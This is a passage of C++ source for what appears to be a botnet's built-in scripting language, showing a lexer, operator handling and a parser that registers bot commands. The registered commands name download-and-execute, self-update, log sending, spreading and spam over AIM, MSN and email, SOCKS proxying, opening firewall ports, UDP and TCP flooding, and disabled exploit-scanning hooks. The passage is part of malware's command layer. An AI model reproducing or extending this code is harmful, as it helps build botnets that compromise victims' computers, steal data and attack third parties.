			SetInteger(Data.Integer < atof(Variable.Data.String));
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			SetInteger(Data.Float < Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(Data.Float < Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(Data.Float < atof(Variable.Data.String));
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetInteger(atof(Data.String) < Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(atof(Data.String) < Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(strcmp(Data.String, Variable.Data.String) < 0 ? 1 : 0);
		}
	}
}

VOID Variable::BitAnd(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer & Variable.Data.Integer);
}

VOID Variable::BitOr(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer | Variable.Data.Integer);
}

VOID Variable::BitXor(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer ^ Variable.Data.Integer);
}

Array::Array(SEL::Parser* Parser){
	Array::Parser = Parser;
}

Variable* Array::Get(UINT Index){
	if(Index > MAX_ARRAY_SIZE){
		#ifdef _DEBUG
		Parser->SetError("Max array size reached");
		#endif
		return NULL;
	}
	while(VariableList.size() <= Index){
		Variable* NewVariable = new Variable;
		Insert(NewVariable);
	}
	return VariableList[Index];
}

VOID Array::Insert(Variable* Variable){
	Parser->MasterItemList.Add((Item*)Variable);
	VariableList.push_back(Variable);
}

Lexer::Lexer(PCHAR Buffer){
	Lexer::Buffer = new CHAR[strlen(Buffer) + 1];
	strcpy(Lexer::Buffer, Buffer);
	Size = strlen(Buffer);
	Error = ERROR_NONE;
	CurrentCharacter = 0;
	TokenOffset = 0;
	LexemeSize = 0;
	Peeked = FALSE;
	NullAdded = FALSE;
	QuoteRemoved = FALSE;
}

Lexer::~Lexer(){
	delete[] Buffer;
}

UINT Lexer::GetNextToken(VOID){
	if(Error)
		return TOKEN_ERROR;
	TokenOffset = 0;
	LexemeSize = 0;
	EndPeek();
	while(CurrentCharacter < Size){
		if(TokenOffset == 0){
			if(NullAdded){
				Buffer[CurrentCharacter] = OldChar;
				NullAdded = FALSE;
			}
			if(QuoteRemoved){
				Buffer[QuotePosition] = '"';
				QuoteRemoved = FALSE;
			}
			IsInteger = FALSE;
			IsFloat = FALSE;
			IsString = FALSE;
			IsVariable = FALSE;
			IsIdentifier = FALSE;
			IsNamespace = FALSE;
			if(isdigit(Buffer[CurrentCharacter])){
				IsInteger = TRUE;
			}else
			if(isalpha(Buffer[CurrentCharacter])){
				IsIdentifier = TRUE;
			}else
			if(Buffer[CurrentCharacter] == '"'){
				IsString = TRUE;
			}else
			if(Buffer[CurrentCharacter] == '$' || Buffer[CurrentCharacter] == '@'){
				if(!isalpha(Buffer[CurrentCharacter + 1])){
					LexemeSize = 0;
					CurrentCharacter++;
					SetError(ERROR_INVALIDVARIABLENAME);
					return TOKEN_ERROR;
				}else{
					IsVariable = TRUE;
				}
			}else
			if(Buffer[CurrentCharacter] == '['){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPENBRACKET;
			}else
			if(Buffer[CurrentCharacter] == ']'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_CLOSEBRACKET;
			}else
			if(Buffer[CurrentCharacter] == '('){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPENPARENTHESIS;
			}else
			if(Buffer[CurrentCharacter] == ')'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_CLOSEPARENTHESIS;
			}else
			if(Buffer[CurrentCharacter] == '{'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPENBRACE;
			}else
			if(Buffer[CurrentCharacter] == '}'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_CLOSEBRACE;
			}else
			if(Buffer[CurrentCharacter] == '?'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPERATOR;
			}else
			if(Buffer[CurrentCharacter] == ':'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPERATOR;
			}else
			if(Buffer[CurrentCharacter] == ','){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_COMMA;
			}else
			if(Buffer[CurrentCharacter] == ';'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_SEMICOLON;
			}else
			if(Buffer[CurrentCharacter] == '~'){
				LexemeSize = 1;
				CurrentCharacter++;
				return TOKEN_OPERATOR;
			}else
			if(Buffer[CurrentCharacter] == '!'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '+'){
				if(Buffer[CurrentCharacter + 1] == '+'){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '-'){
				if(Buffer[CurrentCharacter + 1] == '-'){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '='){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '&'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '&'){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '^'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '|'){
				if(Buffer[CurrentCharacter + 1] == '|'){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '/'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '/'){
					BOOL NewLine = FALSE;
					for(; CurrentCharacter < Size; ++CurrentCharacter){
						if(Buffer[CurrentCharacter] == '\n'){
							NewLine = TRUE;
							break;
						}
					}
					if(NewLine){
						continue;
					}else{

					}
				}else
				if(Buffer[CurrentCharacter + 1] == '*'){
					BOOL CloseFound = FALSE;
					for(; CurrentCharacter < Size; ++CurrentCharacter){
						if(Buffer[CurrentCharacter] == '*' && Buffer[CurrentCharacter + 1] == '/'){
							CurrentCharacter+=2;
							CloseFound = TRUE;
							break;
						}
					}
					if(CloseFound){
						continue;
					}else{
						SetError(ERROR_NOCOMMENTCLOSE);
						return TOKEN_ERROR;
					}
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '%'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '*'){
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '<'){
				if(Buffer[CurrentCharacter + 1] == '<'){
					if(CurrentCharacter + 1 < Size){
						if(Buffer[CurrentCharacter + 2] == '='){
							LexemeSize = 3;
							CurrentCharacter+=3;
							return TOKEN_OPERATOR;
						}
					}
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(Buffer[CurrentCharacter] == '>'){
				if(Buffer[CurrentCharacter + 1] == '>'){
					if(CurrentCharacter + 1 < Size){
						if(Buffer[CurrentCharacter + 2] == '='){
							LexemeSize = 3;
							CurrentCharacter+=3;
							return TOKEN_OPERATOR;
						}
					}
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else
				if(Buffer[CurrentCharacter + 1] == '='){
					LexemeSize = 2;
					CurrentCharacter+=2;
					return TOKEN_OPERATOR;
				}else{
					LexemeSize = 1;
					CurrentCharacter++;
					return TOKEN_OPERATOR;
				}
			}else
			if(isspace(Buffer[CurrentCharacter]) || Buffer[CurrentCharacter] == '\r' || Buffer[CurrentCharacter] == '\n' || Buffer[CurrentCharacter] == '\t'){
				CurrentCharacter++;
				continue;
			}
		}else{
			if(IsIdentifier){
				if(!isalnum(Buffer[CurrentCharacter]) && Buffer[CurrentCharacter] != '_'){
					if(Buffer[CurrentCharacter] == '.'){
						IsNamespace = TRUE;
						TokenOffset++;
						CurrentCharacter++;
					}
					UINT TokenType = GetTokenType();
					IsIdentifier = FALSE;
					IsNamespace = FALSE;
					LexemeSize = TokenOffset;
					if(TokenType != TOKEN_NONE){
						return TokenType;
					}
				}
			}else
			if(IsInteger){
				if(Buffer[CurrentCharacter] == '.'){
					IsInteger = FALSE;
					IsFloat = TRUE;
				}else
				if(!isdigit(Buffer[CurrentCharacter])){
					UINT TokenType = GetTokenType();
					IsInteger = FALSE;
					LexemeSize = TokenOffset;
					if(TokenType != TOKEN_NONE){
						return TokenType;
					}
				}
			}else
			if(IsFloat){
				if(!isdigit(Buffer[CurrentCharacter])){
					UINT TokenType = GetTokenType();
					IsFloat = FALSE;
					LexemeSize = TokenOffset;
					if(TokenType != TOKEN_NONE){
						return TokenType;
					}
				}
			}else
			if(IsString){
				if(Buffer[CurrentCharacter] == '"'){
					Buffer[CurrentCharacter] = NULL;
					QuoteRemoved = TRUE;
					QuotePosition = CurrentCharacter;
					CurrentCharacter++;
					LexemeSize = TokenOffset;
					IsString = FALSE;
					return TOKEN_STRING;
				}else
				if(Buffer[CurrentCharacter] == '\\'){
					CurrentCharacter += 1;
					TokenOffset += 1;
				}
			}else
			if(IsVariable){
				if(!isalnum(Buffer[CurrentCharacter]) && Buffer[CurrentCharacter] != '_'){
					UINT TokenType = GetTokenType();
					IsVariable = FALSE;
					LexemeSize = TokenOffset;
					if(TokenType != TOKEN_NONE){
						return TokenType;
					}
				}
			}
		}
		CurrentCharacter++;
		if(CurrentCharacter >= Size){
			UINT TokenType = GetTokenType();
			if(TokenType != TOKEN_NONE){
				if(TokenType != TOKEN_ERROR){
					LexemeSize = TokenOffset + 1;
				}
				return TokenType;
			}
		}
		TokenOffset++;
	}
	return TOKEN_END;
}

UINT Lexer::PeekNextToken(VOID){
	if(!Peeked){
		OldCurrentCharacter = CurrentCharacter;
		OldLexemeSize = LexemeSize;
	}else{
		Peeked = FALSE;
	}
	UINT PeekToken = GetNextToken();
	Peeked = TRUE;
	return PeekToken;
}

VOID Lexer::EndPeek(VOID){
	if(Peeked){
		if(NullAdded){
			Buffer[CurrentCharacter] = OldChar;
			NullAdded = FALSE;
		}
		CurrentCharacter = OldCurrentCharacter;
		LexemeSize = OldLexemeSize;
		Peeked = FALSE;
	}
}

UINT Lexer::GetTokenType(VOID){
	if(IsNamespace)
		return TOKEN_NAMESPACE;
	if(IsIdentifier)
		return TOKEN_IDENTIFIER;
	if(IsInteger)
		return TOKEN_INTEGER;
	if(IsFloat)
		return TOKEN_FLOAT;
	if(IsString){
		SetError(ERROR_NOSTRINGTERMINATOR);
		return TOKEN_ERROR;
	}
	if(IsVariable)
		return TOKEN_VARIABLE;
	return TOKEN_NONE;
}

VOID Lexer::SetError(UINT Error){
	Lexer::Error = Error;
}

UINT Lexer::GetError(VOID){
	return Error;
}

PCHAR Lexer::GetLexeme(VOID){
	if(!NullAdded)
		OldChar = Buffer[CurrentCharacter];
	NullAdded = TRUE;
	Buffer[CurrentCharacter] = NULL;
	return &Buffer[CurrentCharacter - LexemeSize];
}

VOID Lexer::SetPosition(UINT Character){
	CurrentCharacter = Character;
}

UINT Lexer::GetPosition(VOID){
	return CurrentCharacter;
}

UINT Parser::GetOperatorType(PCHAR Lexeme){
	if(strcmp(Lexeme, "=") == 0){
		return OP_ASSIGN;
	}else
	if(strcmp(Lexeme, "+") == 0){
		return OP_ADD;
	}else
	if(strcmp(Lexeme, "-") == 0){
		return OP_SUBTRACT;
	}else
	if(strcmp(Lexeme, "++") == 0){
		return OP_INCREMENT;
	}else
	if(strcmp(Lexeme, "--") == 0){
		return OP_DECREMENT;
	}else
	if(strcmp(Lexeme, "\x15") == 0){
		return OP_NEGATIVE;
	}else
	if(strcmp(Lexeme, "*") == 0){
		return OP_MULTIPLY;
	}else
	if(strcmp(Lexeme, "/") == 0){
		return OP_DIVIDE;
	}else
	if(strcmp(Lexeme, "%") == 0){
		return OP_MODULUS;
	}else
	if(strcmp(Lexeme, "<<") == 0){
		return OP_LEFTSHIFT;
	}else
	if(strcmp(Lexeme, ">>") == 0){
		return OP_RIGHTSHIFT;
	}else
	if(strcmp(Lexeme, "&") == 0){
		return OP_BITAND;
	}else
	if(strcmp(Lexeme, "|") == 0){
		return OP_BITOR;
	}else
	if(strcmp(Lexeme, "^") == 0){
		return OP_BITXOR;
	}else
	if(strcmp(Lexeme, "~") == 0){
		return OP_BITNOT;
	}else
	if(strcmp(Lexeme, "&&") == 0){
		return OP_AND;
	}else
	if(strcmp(Lexeme, "||") == 0){
		return OP_OR;
	}else
	if(strcmp(Lexeme, "!") == 0){
		return OP_NOT;
	}else
	if(strcmp(Lexeme, "==") == 0){
		return OP_EQUALS;
	}else
	if(strcmp(Lexeme, ">") == 0){
		return OP_GREATERTHAN;
	}else
	if(strcmp(Lexeme, "<") == 0){
		return OP_LESSTHAN;
	}else
	if(strcmp(Lexeme, "!=") == 0){
		return OP_INEQUALITY;
	}else
	if(strcmp(Lexeme, ">=") == 0){
		return OP_GREATEROREQUAL;
	}else
	if(strcmp(Lexeme, "<=") == 0){
		return OP_LESSOREQUAL;
	}else
		return OP_UNKNOWN;
}

BOOL Parser::IsAssignmentOperator(UINT Operator){
	if(Operator == OP_ASSIGN || Operator == OP_INCREMENT || Operator == OP_DECREMENT)
		return TRUE;
	return FALSE;
}

BOOL Parser::IsTerm(UINT TokenType){
	if(TokenType == TOKEN_VARIABLE || TokenType == TOKEN_INTEGER || TokenType == TOKEN_FLOAT || TokenType == TOKEN_STRING)
		return TRUE;
	return FALSE;
}

BOOL Parser::IsOperator(UINT TokenType){
	if(TokenType == TOKEN_OPERATOR)
		return TRUE;
	return FALSE;
}

BOOL Parser::IsUnary(UINT TokenType, PCHAR Lexeme){
	if(IsTerm(TokenType) || GetOperatorType(Lexeme) == OP_NOT || GetOperatorType(Lexeme) == OP_BITNOT || GetOperatorType(Lexeme) == OP_NEGATIVE || GetOperatorType(Lexeme) == OP_INCREMENT || GetOperatorType(Lexeme) == OP_DECREMENT)
		return TRUE;
	return FALSE;
}

BOOL Parser::IsBinary(UINT TokenType, PCHAR Lexeme){
	if(IsOperator(TokenType) && GetOperatorType(Lexeme) != OP_UNKNOWN && GetOperatorType(Lexeme) != OP_NOT && GetOperatorType(Lexeme) != OP_BITNOT && GetOperatorType(Lexeme) != OP_NEGATIVE && GetOperatorType(Lexeme) != OP_INCREMENT && GetOperatorType(Lexeme) != OP_DECREMENT)
		return TRUE;
	return FALSE;
}

Script::Script(PCHAR Buffer){
	Script::Buffer = new CHAR[strlen(Buffer) + 1 + 1];
	strcpy(Script::Buffer, Buffer);
	strcat(Script::Buffer, "}");
	Script::Parser = new SEL::Parser(Script::Buffer, this);
}

Script::~Script(){
	delete[] Buffer;
	delete Parser;
}

VOID Script::Run(VOID){
	StartThread();
}

VOID Script::Abort(VOID){
	Parser->Abort();
}

VOID Script::ThreadFunc(VOID){
	Parser->Run();
}

VOID Script::OnEnd(VOID){
	Scripts.Remove(this);
}

Parser::Parser(PCHAR Buffer, SEL::Script* Script) : Lexer(Buffer), GlobalNameSpace("", this){
	Parser::Buffer = Buffer;
	Parser::Script = Script;
	AbortScript = FALSE;
	CurrentToken = 0;
	CurrentScope = 0;
	Error[0] = NULL;

	// set up the functions
	NameSpace* NameSpaceP2P = new NameSpace("P2P", this);
	MasterItemList.Add(NameSpaceP2P);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceP2P);

	NameSpace* NameSpaceP2PCount = new NameSpace("Count", this);
	MasterItemList.Add(NameSpaceP2PCount);
	NameSpaceP2P->NameSpaceList.Add(NameSpaceP2PCount);

	NameSpace* NameSpaceHTTP = new NameSpace("HTTP", this);
	MasterItemList.Add(NameSpaceHTTP);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceHTTP);

	NameSpace* NameSpaceLogs = new NameSpace("Logs", this);
	MasterItemList.Add(NameSpaceLogs);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceLogs);

	NameSpace* NameSpaceIRC = new NameSpace("IRC", this);
	MasterItemList.Add(NameSpaceIRC);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceIRC);

	NameSpace* NameSpaceAIM = new NameSpace("AIM", this);
	MasterItemList.Add(NameSpaceAIM);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceAIM);

	NameSpace* NameSpaceMSN = new NameSpace("MSN", this);
	MasterItemList.Add(NameSpaceMSN);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceMSN);

	NameSpace* NameSpaceEmail = new NameSpace("Email", this);
	MasterItemList.Add(NameSpaceEmail);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceEmail);

	NameSpace* NameSpaceFTP = new NameSpace("FTP", this);
	MasterItemList.Add(NameSpaceFTP);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceFTP);

	NameSpace* NameSpaceSocks = new NameSpace("Socks", this);
	MasterItemList.Add(NameSpaceSocks);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceSocks);

	NameSpace* NameSpaceFirewall = new NameSpace("Firewall", this);
	MasterItemList.Add(NameSpaceFirewall);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceFirewall);

	/*NameSpace* NameSpaceScan = new NameSpace("Scan", this);
	MasterItemList.Add(NameSpaceScan);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceScan);

	NameSpace* NameSpaceScanTargets = new NameSpace("Targets", this);
	MasterItemList.Add(NameSpaceScanTargets);
	NameSpaceScan->NameSpaceList.Add(NameSpaceScanTargets);*/

	NameSpace* NameSpaceScripts = new NameSpace("Scripts", this);
	MasterItemList.Add(NameSpaceScripts);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceScripts);

	NameSpace* NameSpaceUDP = new NameSpace("UDP", this);
	MasterItemList.Add(NameSpaceUDP);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceUDP);

	NameSpace* NameSpaceTCP = new NameSpace("TCP", this);
	MasterItemList.Add(NameSpaceTCP);
	GlobalNameSpace.NameSpaceList.Add(NameSpaceTCP);

	NameSpace* NameSpacePVAR = new NameSpace("PVAR", this);
	MasterItemList.Add(NameSpacePVAR);
	GlobalNameSpace.NameSpaceList.Add(NameSpacePVAR);

	ProcedureMessageBox* PMessageBox = new ProcedureMessageBox();
	MasterItemList.Add(PMessageBox);
	GlobalNameSpace.ProcedureList.Add(PMessageBox);

	ProcedureRand* PRand = new ProcedureRand();
	MasterItemList.Add(PRand);
	GlobalNameSpace.ProcedureList.Add(PRand);

	ProcedureSleep* PSleep = new ProcedureSleep();
	MasterItemList.Add(PSleep);
	GlobalNameSpace.ProcedureList.Add(PSleep);

	ProcedureTCPTunnel* PTCPTunnel = new ProcedureTCPTunnel();
	MasterItemList.Add(PTCPTunnel);
	GlobalNameSpace.ProcedureList.Add(PTCPTunnel);

	ProcedureGetIdleTime* PGetIdleTime = new ProcedureGetIdleTime();
	MasterItemList.Add(PGetIdleTime);
	GlobalNameSpace.ProcedureList.Add(PGetIdleTime);

	ProcedureGetCountry* PGetCountry = new ProcedureGetCountry();
	MasterItemList.Add(PGetCountry);
	GlobalNameSpace.ProcedureList.Add(PGetCountry);

	ProcedureGetUUID* PGetUUID = new ProcedureGetUUID();
	MasterItemList.Add(PGetUUID);
	GlobalNameSpace.ProcedureList.Add(PGetUUID);

	ProcedureGetUptime* PGetUptime = new ProcedureGetUptime();
	MasterItemList.Add(PGetUptime);
	GlobalNameSpace.ProcedureList.Add(PGetUptime);

	ProcedureGetIP* PGetIP = new ProcedureGetIP();
	MasterItemList.Add(PGetIP);
	GlobalNameSpace.ProcedureList.Add(PGetIP);

	ProcedureGetSubnetMask* PGetSubnetMask = new ProcedureGetSubnetMask();
	MasterItemList.Add(PGetSubnetMask);
	GlobalNameSpace.ProcedureList.Add(PGetSubnetMask);

	ProcedureGetVersion* PGetVersion = new ProcedureGetVersion();
	MasterItemList.Add(PGetVersion);
	GlobalNameSpace.ProcedureList.Add(PGetVersion);

	ProcedureP2PGetPort* PP2PGetPort = new ProcedureP2PGetPort();
	MasterItemList.Add(PP2PGetPort);
	NameSpaceP2P->ProcedureList.Add(PP2PGetPort);

	ProcedureP2PGetMode* PP2PGetMode = new ProcedureP2PGetMode();
	MasterItemList.Add(PP2PGetMode);
	NameSpaceP2P->ProcedureList.Add(PP2PGetMode);

	ProcedureP2PGetLinkedIP* PP2PGetLinkedIP = new ProcedureP2PGetLinkedIP();
	MasterItemList.Add(PP2PGetLinkedIP);
	NameSpaceP2P->ProcedureList.Add(PP2PGetLinkedIP);

	ProcedureP2PCountClients* PP2PCountClients = new ProcedureP2PCountClients();
	MasterItemList.Add(PP2PCountClients);
	NameSpaceP2PCount->ProcedureList.Add(PP2PCountClients);

	ProcedureP2PCountControls* PP2PCountControls = new ProcedureP2PCountControls();
	MasterItemList.Add(PP2PCountControls);
	NameSpaceP2PCount->ProcedureList.Add(PP2PCountControls);

	ProcedureP2PCountLinks* PP2PCountLinks = new ProcedureP2PCountLinks();
	MasterItemList.Add(PP2PCountLinks);
	NameSpaceP2PCount->ProcedureList.Add(PP2PCountLinks);

	ProcedureHTTPDownload* PHTTPDownload = new ProcedureHTTPDownload();
	MasterItemList.Add(PHTTPDownload);
	NameSpaceHTTP->ProcedureList.Add(PHTTPDownload);

	ProcedureHTTPExecute* PHTTPExecute = new ProcedureHTTPExecute();
	MasterItemList.Add(PHTTPExecute);
	NameSpaceHTTP->ProcedureList.Add(PHTTPExecute);

	ProcedureHTTPUpdate* PHTTPUpdate = new ProcedureHTTPUpdate();
	MasterItemList.Add(PHTTPUpdate);
	NameSpaceHTTP->ProcedureList.Add(PHTTPUpdate);

	ProcedureHTTPVisit* PHTTPVisit = new ProcedureHTTPVisit();
	MasterItemList.Add(PHTTPVisit);
	NameSpaceHTTP->ProcedureList.Add(PHTTPVisit);

	ProcedureHTTPPost* PHTTPPost = new ProcedureHTTPPost();
	MasterItemList.Add(PHTTPPost);
	NameSpaceHTTP->ProcedureList.Add(PHTTPPost);

	ProcedureHTTPSpeedTest* PHTTPSpeedTest = new ProcedureHTTPSpeedTest();
	MasterItemList.Add(PHTTPSpeedTest);
	NameSpaceHTTP->ProcedureList.Add(PHTTPSpeedTest);

	ProcedureHTTPHostChildImage* PHTTPHostChildImage = new ProcedureHTTPHostChildImage();
	MasterItemList.Add(PHTTPHostChildImage);
	NameSpaceHTTP->ProcedureList.Add(PHTTPHostChildImage);

	ProcedureLogsSend* PLogsSend = new ProcedureLogsSend();
	MasterItemList.Add(PLogsSend);
	NameSpaceLogs->ProcedureList.Add(PLogsSend);

	ProcedureLogsSearch* PLogsSearch = new ProcedureLogsSearch();
	MasterItemList.Add(PLogsSearch);
	NameSpaceLogs->ProcedureList.Add(PLogsSearch);

	ProcedureIRCNotifyAll* PIRCNotifyAll = new ProcedureIRCNotifyAll();
	MasterItemList.Add(PIRCNotifyAll);
	NameSpaceIRC->ProcedureList.Add(PIRCNotifyAll);

	ProcedureIRCQuitAll* PIRCQuitAll = new ProcedureIRCQuitAll();
	MasterItemList.Add(PIRCQuitAll);
	NameSpaceIRC->ProcedureList.Add(PIRCQuitAll);

	ProcedureIRCNew* PIRCNew = new ProcedureIRCNew();
	MasterItemList.Add(PIRCNew);
	NameSpaceIRC->ProcedureList.Add(PIRCNew);

	ProcedureAIMSpread* PAIMSpread = new ProcedureAIMSpread();
	MasterItemList.Add(PAIMSpread);
	NameSpaceAIM->ProcedureList.Add(PAIMSpread);

	ProcedureAIMSendIM* PAIMSendIM = new ProcedureAIMSendIM();
	MasterItemList.Add(PAIMSendIM);
	NameSpaceAIM->ProcedureList.Add(PAIMSendIM);

	ProcedureAIMSpam* PAIMSpam = new ProcedureAIMSpam();
	MasterItemList.Add(PAIMSpam);
	NameSpaceAIM->ProcedureList.Add(PAIMSpam);

	ProcedureMSNSendIM* PMSNSendIM = new ProcedureMSNSendIM();
	MasterItemList.Add(PMSNSendIM);
	NameSpaceMSN->ProcedureList.Add(PMSNSendIM);

	ProcedureMSNSpam* PMSNSpam = new ProcedureMSNSpam();
	MasterItemList.Add(PMSNSpam);
	NameSpaceMSN->ProcedureList.Add(PMSNSpam);

	#ifndef NO_EMAIL_SPREAD
	ProcedureEmailSpread* PEmailSpread = new ProcedureEmailSpread();
	MasterItemList.Add(PEmailSpread);
	NameSpaceEmail->ProcedureList.Add(PEmailSpread);
	#endif

	#ifndef NO_FTP_SERVER
	ProcedureFTPServer* PFTPServer = new ProcedureFTPServer();
	MasterItemList.Add(PFTPServer);
	NameSpaceFTP->ProcedureList.Add(PFTPServer);
	#endif

	ProcedureSocksStart* PSocksStart = new ProcedureSocksStart();
	MasterItemList.Add(PSocksStart);
	NameSpaceSocks->ProcedureList.Add(PSocksStart);

	ProcedureFirewallOpenPort* PFirewallOpenPort = new ProcedureFirewallOpenPort();
	MasterItemList.Add(PFirewallOpenPort);
	NameSpaceFirewall->ProcedureList.Add(PFirewallOpenPort);

	/*ProcedureScanTargetsAdd* PScanTargetsAdd = new ProcedureScanTargetsAdd();
	MasterItemList.Add(PScanTargetsAdd);
	NameSpaceScanTargets->ProcedureList.Add(PScanTargetsAdd);

	ProcedureScanTargetsClear* PScanTargetsClear = new ProcedureScanTargetsClear();
	MasterItemList.Add(PScanTargetsClear);
	NameSpaceScanTargets->ProcedureList.Add(PScanTargetsClear);

	ProcedureScanTargetsCurrent* PScanTargetsCurrent = new ProcedureScanTargetsCurrent();
	MasterItemList.Add(PScanTargetsCurrent);
	NameSpaceScanTargets->ProcedureList.Add(PScanTargetsCurrent);

	ProcedureScanStart* PScanStart = new ProcedureScanStart();
	MasterItemList.Add(PScanStart);
	NameSpaceScan->ProcedureList.Add(PScanStart);

	ProcedureScanPause* PScanPause = new ProcedureScanPause();
	MasterItemList.Add(PScanPause);
	NameSpaceScan->ProcedureList.Add(PScanPause);

	ProcedureScanSetPayload* PScanSetPayload = new ProcedureScanSetPayload();
	MasterItemList.Add(PScanSetPayload);
	NameSpaceScan->ProcedureList.Add(PScanSetPayload);

	ProcedureScanSetExploit* PScanSetExploit = new ProcedureScanSetExploit();
	MasterItemList.Add(PScanSetExploit);
	NameSpaceScan->ProcedureList.Add(PScanSetExploit);*/

	ProcedureScriptsAbortAll* PScriptsAbortAll = new ProcedureScriptsAbortAll();
	MasterItemList.Add(PScriptsAbortAll);
	NameSpaceScripts->ProcedureList.Add(PScriptsAbortAll);

	ProcedureUDPFlood* PUDPFlood = new ProcedureUDPFlood();
	MasterItemList.Add(PUDPFlood);
	NameSpaceUDP->ProcedureList.Add(PUDPFlood);

	ProcedureTCPFlood* PTCPFlood = new ProcedureTCPFlood();
	MasterItemList.Add(PTCPFlood);
	NameSpaceTCP->ProcedureList.Add(PTCPFlood);

	ProcedurePVARSet* PPVARSet = new ProcedurePVARSet();
	MasterItemList.Add(PPVARSet);
	NameSpacePVAR->ProcedureList.Add(PPVARSet);

	ProcedurePVARGet* PPVARGet = new ProcedurePVARGet();
	MasterItemList.Add(PPVARGet);
	NameSpacePVAR->ProcedureList.Add(PPVARGet);

	ProcedurePVARIsSet* PPVARIsSet = new ProcedurePVARIsSet();
	MasterItemList.Add(PPVARIsSet);
	NameSpacePVAR->ProcedureList.Add(PPVARIsSet);

	ProcedurePVARClear* PPVARClear = new ProcedurePVARClear();
	MasterItemList.Add(PPVARClear);
	NameSpacePVAR->ProcedureList.Add(PPVARClear);
}

